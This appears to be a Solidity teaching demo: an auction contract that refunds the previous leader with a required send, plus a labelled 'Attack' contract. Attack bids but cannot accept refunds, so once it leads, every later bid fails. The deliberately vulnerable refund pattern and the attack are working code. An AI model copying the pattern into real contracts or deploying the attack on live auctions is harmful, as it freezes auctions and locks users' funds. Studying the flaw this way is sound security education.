// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

/**
 * Auction smart contract where can deposit higher token than previos Leader for becomming new leader. 
*/

contract Auction {
  address public currentLeader;
  uint public highestBid;

  /**
   * @dev call for Becomming new leader.
   */

  function bid() external payable
  {
      require(msg.value > highestBid,"can not bid with amount less than previous leader");

      require(payable(currentLeader).send(highestBid));

      currentLeader = msg.sender;
      highestBid = msg.value;
  }
}

/**
 * for attack on auction smart contract
*/

contract Attack
{

  /**
   * @dev calling this attacker can attack on auction smart contract.
   * @param auction auction smart contract address.
   */
  function attack( Auction auction ) public payable {
    auction.bid{value: msg.value}();
  }
}


